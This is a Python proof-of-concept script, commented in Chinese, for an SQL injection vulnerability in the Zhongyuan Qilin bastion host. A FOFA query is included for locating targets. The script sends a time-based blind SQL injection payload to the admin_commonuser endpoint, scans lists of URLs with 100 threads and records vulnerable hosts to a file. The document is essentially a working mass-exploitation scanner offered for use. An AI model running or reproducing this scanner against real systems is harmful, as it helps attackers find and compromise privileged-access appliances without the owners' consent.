# 中远麒麟堡垒机存在SQL注入漏洞
# fofa:cert.subject="Baolei"

import requests,sys,argparse,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """                              _                      
       _                     ( )                   _ 
      (_)   _ _    _     ___ | |__   _   _    _ _ (_)
(`\/')| | /'_` ) /'_`\ /',__)|  _ `\( ) ( ) /'_` )| |
 >  < | |( (_| |( (_) )\__, \| | | || (_) |( (_| || |  version:1.0.0
(_/\_)(_)`\__,_)`\___/'(____/(_) (_)`\___/'`\__,_)(_)  author :冷酷小帅                                             
"""

    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="中远麒麟堡垒机存在SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = '/admin.php?controller=admin_commonuser'
    url = target + payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
        'Connection':'close',
        'Content-Length':'78',
        'Accept':'*/*',
        'Content-Type':'application/x-www-form-urlencoded',
        'Accept-Encoding':'gzip'
    }
    data = "username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    try:
        res = requests.post(url=url, headers=headers, data=data, verify=False, timeout=5) 
        match = re.search(r'"result":0', res.text, re.S)
        if res.status_code == 200 and match: 
            print(f'[+] 该网站存在SQL注入，url为{target}')
            with open('result.txt', 'a') as f:
                f.write(target+'\n')
        else:
            print(f'[-] 该网站不存在SQL注入，url为{target}')
    except Exception as e:
        print(f"[*] 该网站无法访问，url为{target}")
        return False
    
if __name__ == '__main__':
    main()